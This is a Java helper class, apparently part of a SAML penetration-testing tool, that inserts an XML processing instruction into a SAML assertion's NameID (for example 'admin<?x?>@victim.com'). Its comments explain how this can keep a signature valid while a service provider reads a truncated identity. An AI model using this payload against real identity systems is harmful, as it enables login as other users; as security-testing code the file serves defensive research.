package helpers;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NodeList;
import org.w3c.dom.ProcessingInstruction;
import org.xml.sax.SAXException;

import java.io.IOException;

/// XML processing-instruction injection into NameID, analogous to CommentInjection.
///
/// Some XML parsers strip PI nodes differently from comments, which can bypass
/// input normalization that only targets `<!-- -->`. Exclusive C14N (omit-comments)
/// preserves PIs in the canonical form, so behavior differs across stacks:
/// signatures may stay valid on some parsers while naive text extraction on
/// the SP side sees a truncated NameID.
///
/// Cheap complement to CommentInjection — same semantics, different node type.
public class PIInjection {

    public enum Position {
        BEFORE_AT("Before @ — admin<?x?>@victim.com"),
        AFTER_AT("After @  — admin@<?x?>victim.com"),
        PREPEND("Prepend  — <?x?>admin@victim.com"),
        APPEND("Append   — admin@victim.com<?x?>");

        private final String label;
        Position(String label) { this.label = label; }
        @Override public String toString() { return label; }
    }

    /// Inserts a no-op <?x?> processing instruction at the chosen split point
    /// in the first NameID element.
    public static String apply(String samlMessage, Position position) throws SAXException, IOException {
        XMLHelpers xmlHelpers = new XMLHelpers();
        Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(samlMessage);

        NodeList nameIDs = document.getElementsByTagNameNS("*", "NameID");
        if (nameIDs.getLength() == 0) {
            throw new IllegalArgumentException("No NameID element found in SAML message.");
        }

        Element nameID = (Element) nameIDs.item(0);
        String fullValue = nameID.getTextContent();

        while (nameID.hasChildNodes()) {
            nameID.removeChild(nameID.getFirstChild());
        }

        int atIdx = fullValue.indexOf('@');
        ProcessingInstruction pi = document.createProcessingInstruction("x", "");

        switch (position) {
            case BEFORE_AT -> {
                if (atIdx >= 0) {
                    nameID.appendChild(document.createTextNode(fullValue.substring(0, atIdx)));
                    nameID.appendChild(pi);
                    nameID.appendChild(document.createTextNode(fullValue.substring(atIdx)));
                } else {
                    nameID.appendChild(document.createTextNode(fullValue));
                    nameID.appendChild(pi);
                }
            }
            case AFTER_AT -> {
                if (atIdx >= 0) {
                    nameID.appendChild(document.createTextNode(fullValue.substring(0, atIdx + 1)));
                    nameID.appendChild(pi);
                    nameID.appendChild(document.createTextNode(fullValue.substring(atIdx + 1)));
                } else {
                    int mid = fullValue.length() / 2;
                    nameID.appendChild(document.createTextNode(fullValue.substring(0, mid)));
                    nameID.appendChild(pi);
                    nameID.appendChild(document.createTextNode(fullValue.substring(mid)));
                }
            }
            case PREPEND -> {
                nameID.appendChild(pi);
                nameID.appendChild(document.createTextNode(fullValue));
            }
            case APPEND -> {
                nameID.appendChild(document.createTextNode(fullValue));
                nameID.appendChild(pi);
            }
        }

        return xmlHelpers.getString(document);
    }

    private PIInjection() {}
}
